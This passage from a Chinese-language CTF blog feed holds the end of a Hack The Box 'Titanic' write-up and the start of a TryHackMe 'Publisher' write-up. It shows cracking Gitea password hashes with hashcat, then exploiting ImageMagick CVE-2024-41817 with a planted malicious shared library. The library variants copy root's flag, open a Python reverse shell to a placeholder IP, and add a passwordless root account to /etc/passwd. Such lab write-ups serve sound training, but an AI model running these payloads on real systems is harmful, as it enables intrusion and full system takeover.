class="hljs-title">THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO</span>/<span class="hljs-title">F2</span>+8<span class="hljs-title">wvxaCYZJjRE6llM</span>+1<span class="hljs-title">Y</span>=</span><br><span class="hljs-function"><span class="hljs-title">joe:sha256</span>:50000:<span class="hljs-title">FiajbqlCp9GzTwayPi2J5w</span>==:6<span class="hljs-title">LZlGtqfZj61j</span>+<span class="hljs-title">n5F0niXrtwHOaNivA</span>+<span class="hljs-title">QSVNm0z6OpWdtt1P6LCSjEv</span>+<span class="hljs-title">CiZI</span>/<span class="hljs-title">g98z8g</span>=</span><br><span class="hljs-function">1<span class="hljs-title">syn1:sha256</span>:50000:<span class="hljs-title">vaZb17t2MxwgdsIzR80VbQ</span>==:<span class="hljs-title">n7</span>+<span class="hljs-title">oCuJDusqzfF4QwrhVjxi</span>/<span class="hljs-title">O8F7I9eCpV15UUNxTh7Yf5zAFCKmxVGeZJqeIHg8e</span>+<span class="hljs-title">k</span>=</span><br><span class="hljs-function"><span class="hljs-title">kilobyte:sha256</span>:50000:<span class="hljs-title">IW1CB17vWBvpUr46Mb</span>/<span class="hljs-title">VjQ</span>==:<span class="hljs-title">mNamfdFVNSyWLCbAAIQSlg4xMNZOH9I1FOKugFmTBFewWYnmTrbFQYsfi</span>/<span class="hljs-title">bCe0dDGrg</span>=</span><br></code></pre></td></tr></table></figure><p>çˆ†ç ´å¾—åˆ°å¯†ç </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/601fbb69c73422e8.png"></p><p>developer å¯†ç å°±æ˜¯ <code>25282528</code>ï¼Œssh ç™»å½•æ‹¿åˆ° userflag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-number">8</span>fd2b6d8b3295ff48e360a3b4ee855ed<br></code></pre></td></tr></table></figure><h1 id="RootFlag"><a href="#RootFlag" class="headerlink" title="RootFlag"></a>RootFlag</h1><p>æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">developer@titanic:~$ <span class="hljs-title">ps</span> <span class="hljs-title">aux</span></span><br><span class="hljs-function"><span class="hljs-title">USER</span>         <span class="hljs-title">PID</span> %<span class="hljs-title">CPU</span> %<span class="hljs-title">MEM</span>    <span class="hljs-title">VSZ</span>   <span class="hljs-title">RSS</span> <span class="hljs-title">TTY</span>      <span class="hljs-title">STAT</span> <span class="hljs-title">START</span>   <span class="hljs-title">TIME</span> <span class="hljs-title">COMMAND</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+    1174 24.5  0.9 1065140 36656 ?       <span class="hljs-title">Ssl</span>  11:27  14:40 /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">python3</span> /<span class="hljs-title">opt</span>/<span class="hljs-title">app</span>/<span class="hljs-title">app.py</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+    2553  5.1  4.7 1542860 187236 ?      <span class="hljs-title">Ssl</span>  11:27   3:03 /<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">gitea</span> <span class="hljs-title">web</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+   97125  0.0  0.2  17072  9888 ?        <span class="hljs-title">Ss</span>   11:32   0:00 /<span class="hljs-title">lib</span>/<span class="hljs-title">systemd</span>/<span class="hljs-title">systemd</span> --<span class="hljs-title">user</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+   97635  0.0  0.1   8788  5564 <span class="hljs-title">pts</span>/0    <span class="hljs-title">Ss</span>+  11:32   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  391153  0.0  0.1   8788  5564 <span class="hljs-title">pts</span>/1    <span class="hljs-title">Ss</span>+  11:58   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  489859  0.0  0.1   8656  5412 <span class="hljs-title">pts</span>/2    <span class="hljs-title">Ss</span>+  12:09   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  513995  0.0  0.1   8656  5440 <span class="hljs-title">pts</span>/3    <span class="hljs-title">Ss</span>   12:11   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  578623  0.0  0.1   8788  5536 <span class="hljs-title">pts</span>/5    <span class="hljs-title">Ss</span>+  12:17   0:00 -<span class="hljs-title">bash</span></span><br><span class="hljs-function"><span class="hljs-title">develop</span>+  674578  0.0  0.0  10072  1548 <span class="hljs-title">pts</span>/3    <span class="hljs-title">R</span>+   12:26   0:00 <span class="hljs-title">ps</span> <span class="hljs-title">aux</span></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° <code>/opt/app/app.py</code>  æ¶ˆè€—äº†å¤§é‡ CPU èµ„æºï¼Œåœ¨ <code>/opt/scripts</code> ä¸‹æ‰¾åˆ°äº† <code>identify_images.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /opt/app/static/assets/images<br><span class="hljs-built_in">truncate</span> -s 0 metadata.log<br>find /opt/app/static/assets/images/ -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.jpg&quot;</span> | xargs /usr/bin/magick identify &gt;&gt; metadata.log<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹äº†ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶ï¼Œemmmæ²¡å•¥ä¸œè¥¿</p><p><img src="https://img.dkdun.cn/v1/2025/12/87487133510886ea.png"></p><p>æœäº†ä¸€ä¸‹  <code>/usr/bin</code> ä¸‹çš„ <code>magick identify</code>ï¼Œå®ƒæ˜¯ <code>ImageMagic</code> çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œ&#96;&#96;ImageMagic&#96; æ˜¯ä¸€ä¸ªç”¨äºæŸ¥çœ‹ã€ç¼–è¾‘ä½å›¾æ–‡ä»¶ä»¥åŠè¿›è¡Œå›¾åƒæ ¼å¼è½¬æ¢çš„è½¯ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/f43e4168641fd65e.png"></p><p>æŸ¥çœ‹ç‰ˆæœ¬å·</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">developer@titanic:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>$ <span class="hljs-title">magick</span> --<span class="hljs-title">version</span></span><br><span class="hljs-function"><span class="hljs-title">Version</span>: <span class="hljs-title">ImageMagick</span> 7.1.1-35 <span class="hljs-title">Q16</span>-<span class="hljs-title">HDRI</span> <span class="hljs-title">x86_64</span> 1<span class="hljs-title">bfce2a62</span>:20240713 <span class="hljs-title">https</span>://<span class="hljs-title">imagemagick.org</span></span><br><span class="hljs-function"><span class="hljs-title">Copyright</span>: (<span class="hljs-title">C</span>) 1999 <span class="hljs-title">ImageMagick</span> <span class="hljs-title">Studio</span> <span class="hljs-title">LLC</span></span><br><span class="hljs-function"><span class="hljs-title">License</span>: <span class="hljs-title">https</span>://<span class="hljs-title">imagemagick.org</span>/<span class="hljs-title">script</span>/<span class="hljs-title">license.php</span></span><br><span class="hljs-function"><span class="hljs-title">Features</span>: <span class="hljs-title">Cipher</span> <span class="hljs-title">DPC</span> <span class="hljs-title">HDRI</span> <span class="hljs-title">OpenMP</span>(4.5)</span><br><span class="hljs-function"><span class="hljs-title">Delegates</span> (<span class="hljs-title">built</span>-<span class="hljs-title">in</span>): <span class="hljs-title">bzlib</span> <span class="hljs-title">djvu</span> <span class="hljs-title">fontconfig</span> <span class="hljs-title">freetype</span> <span class="hljs-title">heic</span> <span class="hljs-title">jbig</span> <span class="hljs-title">jng</span> <span class="hljs-title">jp2</span> <span class="hljs-title">jpeg</span> <span class="hljs-title">lcms</span> <span class="hljs-title">lqr</span> <span class="hljs-title">lzma</span> <span class="hljs-title">openexr</span> <span class="hljs-title">png</span> <span class="hljs-title">raqm</span> <span class="hljs-title">tiff</span> <span class="hljs-title">webp</span> <span class="hljs-title">x</span> <span class="hljs-title">xml</span> <span class="hljs-title">zlib</span></span><br><span class="hljs-function"><span class="hljs-title">Compiler</span>: <span class="hljs-title">gcc</span> (9.4)</span><br></code></pre></td></tr></table></figure><p>æŸ¥ CVE ï¼Œæ‰¾åˆ°äº† <a href="https://www.cve.org/CVERecord?id=CVE-2024-41817">CVE-2024-41817</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/7df3d39d6eeb0364.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/fd79ef6d97f2c20f.png"></p><p><code>AppImage</code> ç‰ˆæœ¬ <code>ImageMagick</code> åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è®¾ç½® <code>MAGICK_CONFIGURE_PATH</code> å’Œ <code>LD_LIBRARY_PATH</code> ç¯å¢ƒå˜é‡æ—¶å¯èƒ½ä¼šä½¿ç”¨ç©ºè·¯å¾„ï¼Œè¿™å¯èƒ½ä¼šåœ¨æ‰§è¡Œ <code>ImageMagick</code> æ—¶é€šè¿‡åœ¨å½“å‰å·¥ä½œç›®å½•ä¸­åŠ è½½æ¶æ„é…ç½®æ–‡ä»¶æˆ–å…±äº«åº“å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼Œå…·ä½“åœ¨ <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">CVE-2024-41817</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/05a892579621b41d.png"></p><p>åœ¨å·¥ä½œç›®å½•åˆ›å»ºå…±äº«åº“ï¼Œå·¥ä½œç›®å½•åº”è¯¥æ˜¯ <code>/opt/app/static/assets/images/</code></p><p>æ€»ç»“ï¼šåœ¨  <code>shell</code> æ–‡ä»¶ä¸­æ‰¾åˆ°äº†å·¥ä½œç›®å½•ï¼Œåˆå› ä¸ºåœ¨å·¥ä½œç›®å½•ä¸‹ä¼šæœ‰ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡åœ¨ poc é‡Œé¢å†™å…¥å‘½ä»¤æ‹¿åˆ° root</p><h2 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h2><p>å°† <code>root/root.txt</code> å¤åˆ¶åˆ°å½“å‰ç›®å½•æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;cp /root/root.txt root.txt;chmod 777 root.txt&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/4a4a8a5dd790330a.png"></p><p>æ‹¿åˆ° rootflag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">24981e432</span>ecf<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">66462</span>da<span class="hljs-number">1</span>fa<span class="hljs-number">91</span>fff<span class="hljs-number">48</span>f<br></code></pre></td></tr></table></figure><h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><p>ï¼ˆè¿™é‡Œæ˜¯ SWDD å¸ˆå‚…çš„æ•™å­¦ï¼‰å¯ä»¥å‘ç° Machine ä¸Šæœ‰ python3ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨ poc å†™åå¼¹ shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;IP\&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&#x27;&quot;</span>);<br>    <span class="hljs-comment">//exit(0);</span><br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6eaeb6dc89725367.png"></p><p>æ‹¿åˆ° root</p><h2 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h2><p>n0o0b å¸ˆå‚…æ•™çš„ä¸€ç§æ–¹æ³•ï¼ˆå·å¸ˆå­¦è‰ºï¼‰ï¼Œç›´æ¥æ·»åŠ ä¸€ä¸ªæ–°çš„å…å¯†ç™»å½•çš„ root è´¦æˆ·è¿›å»</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">echo</span> &#x27;butt3rf1y::<span class="hljs-number">0</span>:<span class="hljs-number">0</span>::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/790be3ca4fe85fb1.png"></p><p>å¯åŠ¨æœåŠ¡ä¹‹åéƒ½å¾—ç­‰ä¸€ä¼šå„¿æ‰æœ‰å›æ˜¾</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>åé¢è¿˜é€šè¿‡ <code>crontab -l</code> å¯ä»¥å‘ç°æ‰§è¡Œäº†å®šæ—¶ä»»åŠ¡ <code>identify_images.sh</code> ã€<code>cleanup.sh</code>ã€<code>revert.sh</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/a3f4753dd40765a0.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@titanic:~# cat revert.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>/usr/bin/rm /opt/app/tickets/*.json<br>/usr/bin/cp -a -r /root/images /opt/app/static/assets/<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@titanic:~# cat cleanup.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>/usr/bin/rm /opt/app/static/assets/images/libxcb.so.1<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªæ›´æ–° <code>/opt/app/static/assets/</code> ç›®å½•ä¸‹çš„ <code>images/</code> ç›®å½•ï¼Œä¸€ä¸ªåˆ é™¤ <code>/opt/app/static/assets/images/</code> ç›®å½•ä¸‹çš„ <code>libxcb.so.1</code> æ–‡ä»¶</p><h1 id="CVE-2024-41817"><a href="#CVE-2024-41817" class="headerlink" title="CVE-2024-41817"></a>CVE-2024-41817</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>__attribute__((constructor)) <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;id&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure><p>æ¥åˆ†æä¸€ä¸‹è¿™ä¸ª poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -x c -shared -fPIC -o ./libxcb.so<span class="hljs-number">.1</span> - &lt;&lt; EOF<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>-shared</code> åˆ›å»ºä¸€ä¸ªå…±äº«åº“ï¼Œå…±äº«åº“åå­—å°±æ˜¯ <code>./libxcb.so.1</code>ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯ <code>libxcb</code>ï¼Œæˆ‘è§‰å¾—åº”è¯¥æ˜¯è·Ÿ ImageMagick åŠŸèƒ½æœ‰å…³ï¼Œ<code>libxcb</code> æ˜¯ Linuxä¸‹çš„ä¸€ä¸ªå¼€æºçš„é¢å‘ C è¯­è¨€çš„å›¾å½¢åº“ï¼Œå®ƒä¸“ä¸º X Window çª—å£ç³»ç»Ÿå¼€å‘ï¼Œå®ƒæä¾›äº†ç”¨äºè®¿é—® X Window çš„åŸç”Ÿ APIï¼Œä½¿å¾— Linux å¼€å‘è€…å¯ä»¥å‡†ç¡®åœ°è®¿é—® X Window ç³»ç»Ÿã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__attribute__((constructor))<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ GCC ç‰¹æœ‰çš„æ‰©å±•ï¼ŒæŒ‡å®šäº† <code>init()</code> å‡½æ•°åœ¨ <code>main()</code> å‡½æ•°ä¹‹å‰è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç›´æ¥å…ˆæ‰§è¡Œ <code>init()</code> å‡½æ•°å†…å®¹å³è¿™é‡Œçš„ <code>system(&quot;id&quot;)</code> ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Publisher&amp;The Sticker Shop</title>
    <link href="/2025/02/14/Shop/"/>
    <url>/2025/02/14/Shop/</url>
    
    <content type="html"><![CDATA[<p>å­¦åˆ°äº†å­¦åˆ°äº†ï¼Œä¸€ç‚¹ä¸ç†Ÿæ‚‰çš„ææƒã€‚æˆ‘å¥½èœæˆ‘å¥½èœæˆ‘å¥½èœï¼Œé¶æœºæ—¶é—´éƒ½è¿‡äº†é‡å¼€äº†å¥½å‡ æ¬¡ï¼Œæ•´ç†å®Œï¼ˆé¡ºå¸¦æ°´äº†ä¸ªç®€å•çš„ï¼‰å·²ç»å¤©äº®äº†: (</p><span id="more"></span><h1 id="Publisher"><a href="#Publisher" class="headerlink" title="Publisher"></a>Publisher</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The â€œ<strong>Publisher</strong>â€œ CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the systemâ€™s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.</p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">42</span>.<span class="hljs-number">106</span><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">10</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>å¼€æ”¾äº† 22 å’Œ 80</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>è®¿é—® <code>http</code> æœåŠ¡</p><p><img src="https://img.dkdun.cn/v1/2025/12/4cc51155fb8d9ac0.png"></p><p>æ‰«ç›®å½•æ‰«åˆ°äº†å¾ˆå¤š <code>spip</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/ffcdc112e84e4fcf.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/fcf7bc6c74374df0.png"></p><p>æœäº†ä¸€ä¸‹ <code>SPIP</code> ï¼Œæ˜¯ä¸€ä¸ª CMS</p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>ç”¨ msf æŸ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]</span><br><span class="hljs-string">â””â”€#</span> <span class="hljs-string">msfconsole</span> <span class="hljs-string">-q</span><br><span class="hljs-string">msf6</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">search</span> <span class="hljs-string">spip</span><br><br><span class="hljs-string">Matching</span> <span class="hljs-string">Modules</span><br><span class="hljs-string">================</span><br><br>   <span class="hljs-comment">#   Name                                             Disclosure Date  Rank       Check  Description</span><br>   <span class="hljs-bullet">-</span>   <span class="hljs-string">----</span>                                             <span class="hljs-string">---------------</span>  <span class="hljs-string">----</span>       <span class="hljs-string">-----</span>  <span class="hljs-string">-----------</span><br>   <span class="hljs-number">0</span>   <span class="hljs-string">exploit/multi/http/spip_bigup_unauth_rce</span>         <span class="hljs-number">2024-09-06       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">BigUp</span> <span class="hljs-string">Plugin</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">RCE</span><br>   <span class="hljs-number">1</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">2</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">3</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">4</span>   <span class="hljs-string">exploit/multi/http/spip_porte_plume_previsu_rce</span>  <span class="hljs-number">2024-08-16       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">RCE</span> <span class="hljs-string">via</span> <span class="hljs-string">porte_plume</span> <span class="hljs-string">Plugin</span><br>   <span class="hljs-number">5</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">6</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">7</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">8</span>   <span class="hljs-string">exploit/multi/http/spip_connect_exec</span>             <span class="hljs-number">2012-07-04       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">connect</span> <span class="hljs-string">Parameter</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Injection</span><br>   <span class="hljs-number">9</span>     <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">10</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">11</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">12</span>  <span class="hljs-string">exploit/multi/http/spip_rce_form</span>                 <span 